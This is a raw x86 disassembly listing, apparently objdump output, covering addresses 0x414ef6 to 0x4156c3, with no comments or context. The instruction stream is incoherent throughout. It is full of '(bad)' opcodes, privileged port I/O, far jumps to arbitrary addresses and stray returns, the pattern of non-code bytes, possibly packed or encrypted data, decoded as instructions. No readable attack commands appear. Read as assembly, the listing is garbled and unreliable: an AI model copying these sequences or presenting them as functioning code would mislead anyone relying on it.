  414ef6:	xchg   ebx,eax
  414ef7:	push   ecx
  414ef8:	or     al,0x88
  414efa:	cmp    eax,0xbedb5647
  414eff:	and    eax,0x43065944
  414f04:	loopne 0x414f2c
  414f06:	sahf   
  414f07:	ror    BYTE PTR [edi-0x5941b845],0x45
  414f0e:	xor    al,0x9c
  414f10:	mov    cl,BYTE PTR [eax+0x3]
  414f13:	or     dh,bl
  414f15:	sti    
  414f16:	pop    edi
  414f17:	nop
  414f18:	popf   
  414f19:	jmp    0xcc82fb06
  414f1e:	mov    bl,0x4b
  414f20:	jne    0x414f0e
  414f22:	push   ebx
  414f23:	xlat   BYTE PTR ds:[ebx]
  414f24:	xchg   edi,eax
  414f25:	mov    ds:0xc6e869db,al
  414f2a:	xor    BYTE PTR [edx-0x54dedc03],ah
  414f30:	fldcw  WORD PTR [edi+0x7f]
  414f33:	aaa    
  414f34:	addr16 xor eax,0x2ef20d40
  414f3a:	push   es
  414f3b:	adc    cl,ch
  414f3d:	test   BYTE PTR [ebp-0xab5c04e],bh
  414f43:	popf   
  414f44:	ret    
  414f45:	pop    ecx
  414f46:	in     eax,0x33
  414f48:	mov    bl,0xc1
  414f4a:	lea    esp,es:[ecx+ebp*4-0x25e9e1dc]
  414f52:	sbb    DWORD PTR [eax-0x10a1e6f8],0x79b5129f
  414f5c:	dec    edx
  414f5d:	push   ebx
  414f5e:	cmp    BYTE PTR [ebx+0xe],0x82
  414f62:	scas   eax,DWORD PTR es:[edi]
  414f63:	nop
  414f64:	pushf  
  414f65:	jg     0x414f07
  414f67:	mov    edx,0x4cab7ba8
  414f6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f6d:	in     al,dx
  414f6e:	xor    eax,0xd4bf2998
  414f73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f74:	call   0xe93f5b90
  414f79:	xchg   edx,eax
  414f7a:	and    eax,0x32d3d22
  414f7f:	pcmpeqw mm4,mm1
  414f82:	mov    ebx,0xf1050ed3
  414f87:	push   0xffffffbc
  414f89:	call   DWORD PTR [ecx-0x49715144]
  414f8f:	ret    
  414f90:	xchg   ebx,eax
  414f91:	pop    edx
  414f92:	loop   0x414fb3
  414f94:	aad    0x9e
  414f96:	push   0x9ffed664
  414f9b:	push   esp
  414f9c:	jmp    0x414f4f
  414f9e:	loope  0x415013
  414fa0:	xor    ch,dl
  414fa2:	sub    BYTE PTR [esi-0x11],bh
  414fa5:	jmp    0x726ba0bc
  414faa:	scas   al,BYTE PTR es:[edi]
  414fab:	ret    0x2e3d
  414fae:	aas    
  414faf:	mov    ds:0xa9466529,eax
  414fb4:	not    BYTE PTR [edx]
  414fb6:	lods   al,BYTE PTR ds:[esi]
  414fb7:	in     eax,dx
  414fb8:	call   0xf2ce7247
  414fbd:	or     BYTE PTR [eax+0x6c12d6e5],cl
  414fc3:	cmp    eax,0x82f090df
  414fc8:	xchg   esi,eax
  414fc9:	dec    ecx
  414fca:	lods   al,BYTE PTR ds:[esi]
  414fcb:	and    esp,DWORD PTR [edx-0x37]
  414fce:	jns    0x41503a
  414fd0:	aaa    
  414fd1:	aad    0x84
  414fd3:	dec    ebp
  414fd4:	popf   
  414fd5:	adc    BYTE PTR [ebx+0x3cac9182],al
  414fdb:	fidivr DWORD PTR [ebp+0x22]
  414fde:	mov    esi,0x7010d0d5
  414fe3:	imul   ebx,esi,0x61
  414fe6:	popa   
  414fe7:	sub    bl,bh
  414fe9:	sub    ecx,esi
  414feb:	xchg   ebx,eax
  414fec:	lods   al,BYTE PTR ds:[esi]
  414fed:	jae    0x41503b
  414fef:	je     0x41506a
  414ff1:	test   DWORD PTR [ebp-0x77],edi
  414ff4:	dec    DWORD PTR [ebp+eiz*4-0x72dcbc38]
  414ffb:	gs jmp 0x415059
  414ffe:	es mov bh,0x54
  415001:	and    BYTE PTR [edx+0x7e],al
  415004:	xchg   edi,eax
  415005:	sbb    esp,DWORD PTR ds:0xfd184e3c
  41500b:	ss jl  0x415037
  41500e:	inc    ecx
  41500f:	enter  0x66,0x32
  415013:	xchg   esp,eax
  415014:	popa   
  415015:	test   BYTE PTR [eax-0x51],bl
  415018:	mov    al,0x46
  41501a:	jmp    0xbac25f93
  41501f:	into   
  415020:	(bad)  
  415021:	mov    ah,0xd7
  415023:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415024:	and    ebp,DWORD PTR [esi+esi*1-0x67]
  415028:	daa    
  415029:	pop    edi
  41502a:	mov    gs,WORD PTR [esi-0x776a7037]
  415030:	pop    es
  415031:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415032:	mov    ah,0xe6
  415034:	outs   dx,DWORD PTR ds:[esi]
  415036:	neg    ebp
  415038:	inc    esp
  415039:	mov    edx,ebx
  41503b:	iret   
  41503c:	cmp    al,0xe
  41503e:	jb     0x414ff0
  415040:	in     al,dx
  415041:	(bad)  [edx-0x2d]
  415044:	out    dx,al
  415045:	jge    0x415022
  415047:	push   ecx
  415048:	mov    edx,esi
  41504a:	jg     0x414fcd
  41504c:	js     0x4150b5
  41504e:	js     0x41508c
  415050:	mov    ch,0x8f
  415052:	int3   
  415053:	jbe    0x4150d2
  415055:	(bad)
  415059:	mov    dh,0xe6
  41505b:	(bad)  [ecx]
  41505d:	jne    0x4150cc
  41505f:	inc    edx
  415060:	shrd   DWORD PTR [ecx],ecx,cl
  415063:	(bad)  
  415064:	out    dx,eax
  415065:	pop    esi
  415066:	cmc    
  415067:	(bad)  
  415068:	out    0xb6,al
  41506a:	mov    WORD PTR [edx-0x5bc30f51],?
  415070:	sbb    BYTE PTR [ebp-0x4f3d1532],ch
  415076:	aam    0x59
  415078:	in     al,dx
  415079:	mov    ecx,0x19a0646
  41507e:	in     al,dx
  41507f:	xor    DWORD PTR [edx+eax*4],ebx
  415082:	mov    esp,0x17f93b9b
  415087:	addr16 xchg ecx,eax
  415089:	pop    ecx
  41508a:	jo     0x415030
  41508c:	std    
  41508d:	push   eax
  41508e:	ins    DWORD PTR es:[edi],dx
  41508f:	imul   esp,DWORD PTR [edi+0x62],0x3d
  415093:	adc    al,0x51
  415095:	push   eax
  415096:	adc    bl,BYTE PTR [edi+0x64]
  415099:	ds pusha 
  41509b:	sbb    ecx,esi
  41509d:	fld    TBYTE PTR [esi+edi*8-0x423ae7bf]
  4150a4:	cdq    
  4150a5:	push   edi
  4150a6:	push   edi
  4150a7:	das    
  4150a8:	std    
  4150a9:	pop    ebp
  4150aa:	shl    DWORD PTR [edi+eax*1+0x58],1
  4150ae:	fcom   DWORD PTR [edi+edx*4]
  4150b1:	icebp  
  4150b2:	xor    bl,BYTE PTR [eax]
  4150b4:	icebp  
  4150b5:	inc    ebx
  4150b6:	out    dx,al
  4150b7:	les    eax,FWORD PTR [eax+0x31]
  4150ba:	(bad)  
  4150bb:	cld    
  4150bc:	mov    ebp,0xabb9611d
  4150c1:	sbb    BYTE PTR [edi-0x51],0x27
  4150c5:	lds    edi,FWORD PTR [ebp-0x22]
  4150c8:	test   DWORD PTR [eax-0x21],edi
  4150cb:	int    0x9b
  4150cd:	lods   al,BYTE PTR ds:[esi]
  4150ce:	sbb    al,BYTE PTR [ebp-0x66]
  4150d1:	jbe    0x4150bd
  4150d3:	loope  0x41506e
  4150d5:	sar    DWORD PTR [eax],cl
  4150d7:	scas   al,BYTE PTR es:[edi]
  4150d8:	jns    0x415118
  4150da:	jbe    0x4150c7
  4150dc:	popa   
  4150dd:	mov    ebx,0x7d0cd649
  4150e2:	sub    DWORD PTR [eax],0x93274f82
  4150e8:	push   ds
  4150e9:	xor    bh,BYTE PTR [eax+0x5d]
  4150ec:	sub    esi,eax
  4150ee:	fldenv [ebx-0x48dc161b]
  4150f4:	idiv   DWORD PTR [ebp-0x35]
  4150f7:	or     al,0x37
  4150f9:	push   esi
  4150fb:	daa    
  4150fc:	in     eax,0x6b
  4150fe:	inc    edi
  4150ff:	or     al,0x71
  415101:	xor    BYTE PTR [ebx],0x41
  415104:	aaa    
  415105:	sub    al,0x22
  415107:	cmp    al,0xb0
  415109:	out    0xf7,eax
  41510b:	loop   0x415153
  41510d:	out    0x52,eax
  41510f:	add    dl,ch
  415111:	sub    ah,ch
  415113:	mov    ds:0xb9a20526,eax
  415118:	jbe    0x4150c0
  41511a:	or     eax,0x976398d3
  41511f:	sub    bh,0xeb
  415122:	into   
  415123:	dec    esp
  415124:	test   al,0xd9
  415126:	adc    DWORD PTR [eax],edi
  415128:	pop    ecx
  415129:	sub    al,0xa6
  41512b:	and    BYTE PTR [edx],al
  41512d:	jbe    0x4150ef
  41512f:	pop    ds
  415130:	in     al,0x98
  415132:	adc    eax,0xad3c89a5
  415137:	jmp    DWORD PTR cs:[esp+eax*1-0x7186e8fe]
  41513f:	js     0x4151a6
  415141:	adc    cl,ah
  415143:	cmp    dl,bh
  415145:	xor    ebp,DWORD PTR [esi-0x61]
  415148:	jmp    0x9eeb0e4d
  41514d:	xchg   edi,eax
  41514e:	les    esi,FWORD PTR [esi+0x50]
  415151:	jg     0x415166
  415153:	xlat   BYTE PTR ds:[ebx]
  415154:	jne    0x41513e
  415156:	ds (bad) 
  415158:	aad    0xf6
  41515a:	jns    0x41511d
  41515c:	int    0xeb
  41515e:	mov    ds:0xabb324b1,al
  415163:	cmp    DWORD PTR [edi-0x76d7fadc],esp
  415169:	cli    
  41516a:	jge    0x4151e0
  41516c:	mov    eax,0xec8fc53d
  415171:	jmp    0xc0f10086
  415176:	add    al,0xe4
  415178:	and    BYTE PTR [ebp-0x693ee162],bl
  41517e:	scas   eax,DWORD PTR es:[edi]
  41517f:	or     eax,0xe49d79d6
  415184:	xor    al,0xcf
  415186:	pop    edx
  415187:	xchg   edx,eax
  415188:	pop    edi
  415189:	int    0x1c
  41518b:	jmp    0x4a58:0x1db586b6
  415192:	dec    esi
  415193:	fadd   st(5),st
  415195:	xchg   ebx,eax
  415196:	test   edx,ebx
  415198:	dec    esp
  415199:	(bad)  
  41519a:	scas   al,BYTE PTR es:[edi]
  41519b:	sahf   
  41519c:	js     0x415140
  41519e:	dec    ebp
  41519f:	cmp    DWORD PTR [di-0x3d89],edi
  4151a4:	jle    0x415166
  4151a6:	enter  0x78c1,0xfd
  4151aa:	pop    ecx
  4151ab:	sbb    bh,BYTE PTR [eax+0x5c8c846e]
  4151b1:	vunpcklps ymm2,ymm1,YMMWORD PTR [ecx+0x37]
  4151b6:	add    ebx,esp
  4151b8:	aaa    
  4151b9:	dec    BYTE PTR [ebp-0x7b30d2a2]
  4151bf:	cwde   
  4151c0:	out    0xe5,eax
  4151c2:	scas   eax,DWORD PTR es:[edi]
  4151c3:	out    0x87,al
  4151c5:	xchg   ebx,eax
  4151c6:	fld    QWORD PTR [ecx-0x40]
  4151c9:	xor    eax,0xfad3dad8
  4151ce:	clc    
  4151cf:	xlat   BYTE PTR ds:[ebx]
  4151d0:	dec    edi
  4151d1:	push   ebx
  4151d2:	jge    0x415164
  4151d4:	sub    BYTE PTR [ebx+0x4b],cl
  4151d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151d8:	inc    ecx
  4151d9:	dec    eax
  4151da:	(bad)  
  4151db:	aas    
  4151dc:	fiadd  WORD PTR [ebp+ebp*2-0x7aa5115f]
  4151e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151e4:	pop    edi
  4151e5:	push   es
  4151e6:	out    0x20,eax
  4151e8:	push   esi
  4151e9:	js     0x415190
  4151eb:	dec    ecx
  4151ec:	sbb    al,0xd1
  4151ee:	ss xchg ecx,eax
  4151f0:	push   ss
  4151f1:	push   cs
  4151f2:	test   DWORD PTR [edx-0x7546dbee],ebp
  4151f8:	add    BYTE PTR [edi-0x19a16089],al
  4151fe:	call   0x633c065
  415203:	inc    eax
  415204:	push   ecx
  415205:	fisttp DWORD PTR [esi+0x7b]
  415208:	(bad)  
  415209:	xlat   BYTE PTR ds:[ebx]
  41520a:	test   eax,0xe1d73bcf
  41520f:	push   edi
  415210:	dec    esp
  415211:	imul   esp,DWORD PTR [esi+0x6d],0x7745dc67
  415218:	jle    0x41524d
  41521a:	aad    0x73
  41521c:	xor    eax,0xf4aa967
  415221:	retf   0x1d53
  415224:	aaa    
  415225:	sti    
  415226:	jmp    0xd34b:0xc6a1a4f5
  41522d:	sub    BYTE PTR [edx-0x80],al
  415230:	(bad)  
  415231:	jmp    0x415293
  415233:	aaa    
  415234:	push   ds
  415235:	pop    esi
  415236:	aaa    
  415237:	cmp    edi,edx
  415239:	fidiv  WORD PTR [edi+eax*1]
  41523c:	dec    ebp
  41523d:	sar    BYTE PTR [ebx],0x43
  415240:	scas   al,BYTE PTR es:[edi]
  415241:	cmp    edi,esi
  415243:	mov    ds:0x3cecbf31,eax
  415248:	adc    DWORD PTR [ecx+edi*8+0x39],esi
  41524c:	sbb    DWORD PTR [ecx+0x6e],edi
  41524f:	sub    DWORD PTR [esi+0x52666597],esp
  415255:	and    DWORD PTR [edi+0x57],ebx
  415258:	mov    esp,0x700270fd
  41525d:	(bad)
  415260:	retf   
  415261:	faddp  st(7),st
  415263:	push   cs
  415264:	mov    edx,0x48ab2c96
  415269:	push   eax
  41526a:	popf   
  41526b:	and    al,0xf9
  41526d:	js     0x415253
  41526f:	mov    fs,WORD PTR [ebx+0x2156b6bc]
  415275:	sbb    eax,0x49c9cdd2
  41527a:	ins    BYTE PTR es:[edi],dx
  41527b:	aam    0xd6
  41527d:	stc    
  41527e:	adc    eax,0x52066f93
  415283:	iret   
  415284:	push   edx
  415285:	inc    edi
  415286:	popf   
  415287:	cdq    
  415288:	mov    ebx,0x9c09cd21
  41528d:	loope  0x4152d9
  41528f:	test   cl,al
  415291:	push   esp
  415292:	(bad)  
  415294:	pop    eax
  415295:	xor    BYTE PTR [ecx],ah
  415297:	and    BYTE PTR [ebx-0x318ac3e0],ah
  41529d:	push   0xa7955925
  4152a2:	mov    bl,0xe0
  4152a4:	mov    ebx,0x49c8557f
  4152a9:	(bad)  [edx-0x47]
  4152ac:	test   al,0x4c
  4152ae:	mov    esp,0xb395dd27
  4152b3:	sub    ecx,esp
  4152b5:	xor    BYTE PTR [ebp+0x6c],0xc5
  4152b9:	inc    edi
  4152ba:	xlat   BYTE PTR ds:[ebx]
  4152bb:	neg    BYTE PTR ds:0xa28022eb
  4152c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152c2:	neg    DWORD PTR [ebp+0x47]
  4152c5:	loope  0x415282
  4152c7:	mov    ds:0xcf431417,eax
  4152cc:	add    eax,0x3effc35a
  4152d1:	call   0xd8ca1f74
  4152d6:	xchg   esi,eax
  4152d7:	push   ds
  4152d8:	nop
  4152d9:	push   0x449d876
  4152de:	mov    eax,ds:0xebcd636d
  4152e3:	xchg   ebx,eax
  4152e4:	pop    es
  4152e5:	out    dx,al
  4152e6:	mov    bh,0xb
  4152e8:	mov    edx,0x389769b1
  4152ed:	loopne 0x415362
  4152ef:	lods   al,BYTE PTR ds:[esi]
  4152f0:	cmc    
  4152f1:	test   eax,0x157df418
  4152f6:	les    ebx,FWORD PTR [edx-0x56719698]
  4152fc:	push   0x20
  4152fe:	xchg   esi,eax
  4152ff:	cmp    BYTE PTR [ebx-0x3e],0x8a
  415303:	cs pop ebp
  415305:	and    BYTE PTR [edi],0xe6
  415308:	sub    eax,0xab53674d
  41530d:	sti    
  41530e:	jl     0x4152e5
  415310:	xor    ah,BYTE PTR [ebx]
  415312:	scas   eax,DWORD PTR es:[edi]
  415313:	dec    ebp
  415314:	div    BYTE PTR [edi]
  415316:	(bad)  
  415317:	mov    eax,0x1820b80a
  41531c:	pushf  
  41531d:	or     DWORD PTR [esp+edx*4+0x76bfe067],esi
  415324:	pop    ds
  415325:	xchg   ebp,eax
  415326:	test   al,0x2c
  415328:	cmp    al,0xca
  41532a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41532b:	mov    DWORD PTR [edi],ebx
  41532d:	aas    
  41532e:	jbe    0x4153a8
  415330:	sbb    DWORD PTR [ecx+0x2f2c82e8],esi
  415336:	sahf   
  415337:	dec    ebp
  415338:	in     al,0x71
  41533a:	mov    dh,BYTE PTR [ebp-0x49e63f6a]
  415340:	dec    esp
  415341:	and    edi,DWORD PTR [ebp+0x21ff5cc0]
  415347:	mov    edi,0x4e307d0e
  41534c:	sahf   
  41534d:	sbb    BYTE PTR [ebx],cl
  41534f:	push   eax
  415350:	ret    
  415351:	jle    0x41532e
  415353:	mov    bl,0x5c
  415355:	adc    al,0x6d
  415357:	jge    0x4153bc
  415359:	mov    bh,0x11
  41535b:	adc    al,0x2e
  41535d:	adc    eax,0xede67f5b
  415362:	pop    ss
  415363:	test   BYTE PTR [eax+0x4fe77e98],0xc1
  41536a:	pop    es
  41536b:	or     DWORD PTR [esi+ecx*8-0x2083063b],eax
  415372:	mov    dh,0x9f
  415374:	(bad)  
  415375:	es sub eax,0xc3b028fc
  41537b:	push   ebp
  41537c:	enter  0x573d,0xec
  415380:	sahf   
  415381:	fistp  DWORD PTR [edi+0x37958947]
  415387:	lea    ebx,[ecx-0x35fcea90]
  41538d:	in     eax,0xf3
  41538f:	add    edi,DWORD PTR [eax+0x58]
  415392:	ret    
  415393:	imul   ebp,edx,0x24
  415396:	add    DWORD PTR [esi+0x26],ebp
  415399:	repnz hlt 
  41539b:	xor    edi,DWORD PTR [esp+edx*8]
  41539e:	push   0xffffffa6
  4153a0:	call   0xa1e0:0x8bc292b6
  4153a7:	mov    ah,0xce
  4153a9:	xor    ebx,DWORD PTR [eax]
  4153ab:	adc    eax,0x89cb48b8
  4153b0:	add    bl,BYTE PTR [ecx]
  4153b2:	push   0xe5175efc
  4153b7:	xchg   dx,ax
  4153b9:	push   0x3b
  4153bb:	pushf  
  4153bc:	mov    edi,0xecdd3933
  4153c1:	out    0x20,al
  4153c3:	stc    
  4153c4:	xchg   ecx,eax
  4153c5:	fwait
  4153c6:	icebp  
  4153c7:	mov    BYTE PTR [edi],ah
  4153c9:	nop
  4153ca:	retf   0xb381
  4153cd:	test   DWORD PTR ds:0xcbc0eea6,eax
  4153d3:	xlat   BYTE PTR ds:[ebx]
  4153d4:	xchg   ebx,eax
  4153d5:	iret   
  4153d6:	add    al,bh
  4153d8:	add    DWORD PTR [esi-0x3ace760c],edx
  4153de:	inc    eax
  4153df:	pop    ebp
  4153e0:	fnstcw WORD PTR [edi-0x21d00352]
  4153e6:	mov    gs,WORD PTR [edi]
  4153e8:	pop    esp
  4153e9:	pop    edx
  4153ea:	test   DWORD PTR [ecx+0x69],esi
  4153ed:	inc    esi
  4153ee:	add    DWORD PTR [ebp+0x465ea331],esp
  4153f4:	ds jl  0x415399
  4153f7:	fsub   QWORD PTR [ebx-0x7585a104]
  4153fd:	daa    
  4153fe:	jae    0x4153aa
  415400:	repz fistp DWORD PTR ds:0xf795ab1c
  415407:	jo     0x4153e6
  415409:	push   eax
  41540a:	hlt    
  41540b:	neg    WORD PTR [ebx+0x3191f8ee]
  415412:	mov    esi,0x446de1ae
  415417:	mov    bl,0x1
  415419:	xor    DWORD PTR [edx+0x4380d196],esp
  41541f:	pusha  
  415420:	leave  
  415421:	fcomp  QWORD PTR es:[edi+0x0]
  415425:	add    al,0x55
  415427:	inc    ebx
  415428:	out    dx,al
  415429:	push   edx
  41542a:	fsubp  st(4),st
  41542c:	mov    esi,0xf6142555
  415431:	int3   
  415432:	xchg   esp,eax
  415433:	lods   eax,DWORD PTR ds:[esi]
  415434:	ds cli 
  415436:	xchg   esp,eax
  415437:	inc    eax
  415438:	sub    DWORD PTR [ecx-0x61ea1ab0],eax
  41543e:	ins    BYTE PTR es:[edi],dx
  41543f:	pop    edi
  415440:	out    dx,al
  415441:	jmp    0xa96f:0xf899c7f
  415448:	mov    es,edx
  41544a:	sbb    eax,edx
  41544c:	ror    DWORD PTR [edi+0x5eff72d0],cl
  415452:	cdq    
  415453:	sbb    eax,0x55564b9d
  415458:	rcr    ebp,0x63
  41545b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41545c:	fwait
  41545d:	mov    bl,0xd0
  41545f:	js     0x4154d3
  415461:	pop    edi
  415462:	cwde   
  415463:	push   eax
  415464:	je     0x415420
  415466:	add    eax,0xae48c20
  41546b:	push   ebp
  41546c:	xchg   DWORD PTR [eax-0x6b],ecx
  41546f:	mov    edx,DWORD PTR [ebx-0x41]
  415472:	fiadd  DWORD PTR ds:0xa3d2c727
  415478:	scas   al,BYTE PTR es:[edi]
  415479:	push   0xdd2ae9e5
  41547e:	sbb    al,0x48
  415480:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415481:	mov    al,ds:0x9b64f861
  415486:	and    esp,DWORD PTR [ecx-0x55]
  415489:	cdq    
  41548a:	sbb    ecx,DWORD PTR [eax]
  41548c:	outs   dx,BYTE PTR ds:[esi]
  41548d:	mov    ah,0xad
  41548f:	icebp  
  415490:	jp     0x4154be
  415492:	test   DWORD PTR [edx],esp
  415494:	out    0x25,eax
  415496:	test   BYTE PTR fs:[ecx+0x55f6935a],dh
  41549d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41549e:	jg     0x41550f
  4154a0:	(bad)  
  4154a1:	cld    
  4154a2:	fistp  DWORD PTR [edx+eax*8-0x76]
  4154a6:	pop    eax
  4154a7:	dec    eax
  4154a8:	adc    eax,DWORD PTR es:[edi]
  4154ab:	and    al,0x28
  4154ad:	lds    ecx,FWORD PTR ds:0x501593b4
  4154b3:	mov    bh,0x53
  4154b5:	jge    0x415507
  4154b7:	dec    ebp
  4154b8:	loope  0x41546b
  4154ba:	ins    BYTE PTR es:[edi],dx
  4154bb:	sar    DWORD PTR [edi],0x83
  4154be:	stos   DWORD PTR es:[edi],eax
  4154bf:	sti    
  4154c0:	les    esi,FWORD PTR [eax]
  4154c2:	cdq    
  4154c3:	mov    ah,0xb0
  4154c5:	add    ecx,edi
  4154c7:	mov    ah,0x57
  4154c9:	mov    esp,0xc03603fb
  4154ce:	mov    esi,0xf0df4245
  4154d3:	push   edi
  4154d4:	in     al,dx
  4154d5:	lods   al,BYTE PTR ds:[esi]
  4154d6:	aaa    
  4154d7:	lods   al,BYTE PTR ds:[esi]
  4154d8:	mov    dh,0x9b
  4154da:	or     cl,dl
  4154dc:	out    0x4,eax
  4154de:	adc    BYTE PTR fs:[esp+edx*1+0x57c9e1ee],bh
  4154e6:	xchg   edx,eax
  4154e7:	cmp    BYTE PTR [eax-0x7faaeedf],dl
  4154ed:	fs push esi
  4154ef:	dec    edx
  4154f0:	dec    edi
  4154f1:	mov    ecx,0x7346e1f9
  4154f6:	cmp    DWORD PTR [edx],ebx
  4154f8:	push   ebp
  4154f9:	jge    0x4154d2
  4154fb:	jp     0x41550e
  4154fd:	nop
  4154fe:	pop    esp
  4154ff:	jecxz  0x415562
  415501:	dec    eax
  415502:	sub    al,0x2e
  415504:	and    eax,0xd5a99bf0
  415509:	mov    ebp,0xc1533f11
  41550e:	add    eax,eax
  415510:	jp     0x41556e
  415512:	aas    
  415513:	das    
  415514:	push   edx
  415515:	jne    0x415568
  415517:	push   ebp
  415518:	dec    esi
  415519:	mov    eax,0x7f56a0cd
  41551e:	ja     0x4154aa
  415520:	jne    0x4154a4
  415522:	aas    
  415523:	leave  
  415524:	shl    edi,cl
  415526:	div    esp
  415528:	sub    BYTE PTR [esi+ecx*1-0x51],bl
  41552c:	(bad)  
  41552d:	push   esi
  41552e:	dec    ebx
  41552f:	pop    ebx
  415530:	pop    es
  415531:	and    bl,BYTE PTR [esp+edi*2+0x40]
  415535:	xor    BYTE PTR [edx-0x1a5f17de],cl
  41553b:	jle    0x415555
  41553d:	into   
  41553e:	imul   esp,DWORD PTR [ecx+esi*1],0xffffffe9
  415542:	pop    ds
  415543:	call   0xb93a:0xb11d1e29
  41554a:	out    dx,eax
  41554b:	shl    DWORD PTR [edx+0x5fd3802a],0x8e
  415552:	loopne 0x4154e8
  415554:	push   ds
  415555:	or     eax,0xaee9b0f0
  41555a:	(bad)  
  41555b:	lds    ebp,FWORD PTR [esi+0x5]
  41555e:	or     ch,BYTE PTR fs:[edx]
  415561:	in     al,0xb6
  415563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415564:	inc    ebx
  415565:	mov    ebp,0xd56c9832
  41556a:	mov    bl,0x56
  41556c:	mov    cl,0x6f
  41556e:	jge    0x415578
  415570:	dec    eax
  415571:	push   cs
  415572:	dec    edx
  415573:	outs   dx,BYTE PTR ds:[esi]
  415574:	push   ds
  415575:	dec    esi
  415576:	loopne 0x41558a
  415578:	arpl   WORD PTR [edi-0x6baddf61],dx
  41557e:	and    BYTE PTR [esi-0x7b],dh
  415581:	mov    ah,0x1c
  415583:	retf   
  415584:	js     0x415525
  415586:	xor    DWORD PTR [edx-0x13],edx
  415589:	or     ebp,DWORD PTR [edi-0x78d162ce]
  41558f:	add    eax,0x4540274d
  415594:	or     al,BYTE PTR [ebx]
  415596:	mov    ah,0xb6
  415598:	and    ebp,DWORD PTR ds:0xf6590687
  41559e:	dec    edx
  41559f:	add    edi,edx
  4155a1:	push   cs
  4155a2:	dec    esp
  4155a3:	in     eax,0x72
  4155a5:	(bad)  
  4155a7:	jmp    0x415567
  4155a9:	adc    BYTE PTR [ebx],al
  4155ab:	mov    ds:0xa29cad90,eax
  4155b0:	aad    0xb4
  4155b2:	inc    ecx
  4155b3:	outs   dx,DWORD PTR ds:[esi]
  4155b4:	pop    DWORD PTR [ecx-0x68]
  4155b7:	fmulp  st(5),st
  4155b9:	add    al,0x40
  4155bb:	dec    ebp
  4155bc:	jl     0x4155cb
  4155be:	sbb    BYTE PTR [edi],cl
  4155c0:	mov    bl,0x82
  4155c2:	loopne 0x41563f
  4155c4:	cmp    BYTE PTR [edi],bl
  4155c6:	dec    eax
  4155c7:	aaa    
  4155c8:	push   eax
  4155c9:	mov    bl,0x90
  4155cb:	or     cl,BYTE PTR [eax]
  4155cd:	fnstsw WORD PTR [ebx+ecx*8+0x46fff69b]
  4155d4:	cmp    al,0x5f
  4155d6:	loope  0x41562e
  4155d8:	or     al,0x9e
  4155da:	icebp  
  4155db:	or     eax,0x1f0141cb
  4155e0:	jae    0x415577
  4155e2:	rcl    BYTE PTR [ecx-0x35],0x21
  4155e6:	inc    ecx
  4155e7:	ror    DWORD PTR [esi+0x16a00b83],0xec
  4155ee:	fadd   QWORD PTR [ecx]
  4155f0:	test   DWORD PTR [edi+eax*2-0x6a20078c],ebp
  4155f7:	sub    al,cl
  4155f9:	mov    gs,WORD PTR [ecx]
  4155fb:	xor    BYTE PTR [edi],dl
  4155fd:	lods   al,BYTE PTR ds:[esi]
  4155fe:	xchg   esp,eax
  4155ff:	jno    0x415639
  415601:	push   edi
  415602:	add    BYTE PTR [esi+0x7e],0xf
  415606:	lock mov ecx,eax
  415609:	mov    bl,0x62
  41560b:	cmp    BYTE PTR fs:[esi+edi*2-0xd],bh
  415610:	inc    esp
  415611:	retf   
  415612:	xor    al,0x15
  415614:	push   ds
  415615:	gs adc eax,0xc5a367be
  41561b:	mov    al,0x2a
  41561d:	cmp    cl,ah
  41561f:	es ins BYTE PTR es:[edi],dx
  415621:	dec    esp
  415622:	dec    edx
  415623:	ja     0x4155d3
  415625:	stos   DWORD PTR es:[edi],eax
  415626:	mov    ah,0xd7
  415628:	add    ebx,ebp
  41562a:	and    DWORD PTR [edx+ebx*8],esi
  41562d:	shl    esi,0x4
  415630:	imul   ecx,DWORD PTR [esp+edi*2],0xffffffe2
  415634:	pop    ebx
  415635:	or     DWORD PTR [ebx+0x6c],0xaef3a80
  41563c:	xor    eax,0xeec90956
  415641:	or     BYTE PTR [eax+esi*2-0xf4d9d56],ch
  415648:	test   dl,dl
  41564a:	push   0x29923a1
  41564f:	push   ecx
  415650:	aaa    
  415651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415652:	scas   eax,DWORD PTR es:[edi]
  415653:	adc    ah,BYTE PTR [ebp+0x1b5351c0]
  415659:	sbb    BYTE PTR [edi],bl
  41565b:	iret   
  41565c:	ins    DWORD PTR es:[edi],dx
  41565d:	loopne 0x415647
  41565f:	xor    DWORD PTR [edi-0x79e5760c],ecx
  415665:	push   ebp
  415666:	aam    0xc9
  415668:	pop    ebx
  415669:	shr    ebx,cl
  41566b:	clc    
  41566c:	loop   0x4155f6
  41566e:	cdq    
  41566f:	mov    BYTE PTR [ebp+0x31],dl
  415672:	cdq    
  415673:	lds    ebp,FWORD PTR [edx-0x15]
  415676:	jmp    0x9287:0xd790816e
  41567d:	cli    
  41567e:	cmp    edi,DWORD PTR [edi+esi*1]
  415681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415682:	imul   ebp,ebp,0x2cf5a2f9
  415688:	xchg   esp,eax
  415689:	sahf   
  41568a:	cld    
  41568b:	add    al,0x88
  41568d:	mov    esp,0x21a5b006
  415692:	div    BYTE PTR [esi]
  415694:	jp     0x4156ed
  415696:	pop    ds
  415697:	jmp    DWORD PTR [bp+di-0x47]
  41569b:	and    BYTE PTR [edx],ah
  41569d:	fbld   TBYTE PTR [edx+edi*1]
  4156a0:	ret    0xc0cb
  4156a3:	imul   eax,DWORD PTR [edi+ebp*1-0x28],0xffffffbf
  4156a8:	mov    ebp,0x7350addf
  4156ad:	leave  
  4156ae:	lea    esp,[edx+esi*1]
  4156b1:	pop    esi
  4156b2:	imul   eax,edx,0x4a
  4156b5:	arpl   si,dx
  4156b7:	(bad)  
  4156b8:	shl    ah,1
  4156ba:	pop    edx
  4156bb:	xchg   esp,eax
  4156bc:	lock and DWORD PTR [edx-0x29e21b24],edx
  4156c3:	adc    BYTE PTR [eax],0xcc
